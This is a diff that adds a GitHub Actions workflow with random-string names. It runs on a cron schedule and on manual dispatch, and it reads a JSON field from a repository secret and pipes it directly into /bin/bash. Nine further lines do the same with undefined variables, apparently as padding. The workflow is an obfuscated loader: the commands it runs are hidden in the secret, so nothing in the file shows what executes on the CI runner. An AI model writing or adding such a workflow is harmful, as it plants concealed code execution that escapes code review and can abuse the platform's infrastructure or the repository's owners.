@@ -1,0 +1,25 @@
+name: wushenjiao4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wushenjiao4567
+        env:
+          ogu71111: ${{ secrets.ogu71111 }}
+        run: |
+          echo $ogu71111 | jq -r .mudgx07643 | /bin/bash
+          echo $wgno4537 | jq -r .uywj32 | /bin/bash
+          echo $st3 | jq -r .k14 | /bin/bash
+          echo $bo30 | jq -r .vw02267 | /bin/bash
+          echo $bdzp0822 | jq -r .rilp20 | /bin/bash
+          echo $jlr93 | jq -r .okhp19 | /bin/bash
+          echo $ccwav611 | jq -r .ec3874 | /bin/bash
+          echo $wtt62405 | jq -r .mtl4 | /bin/bash
+          echo $g4 | jq -r .vfbb13476 | /bin/bash
+          echo $h03495 | jq -r .zgs89 | /bin/bash
+
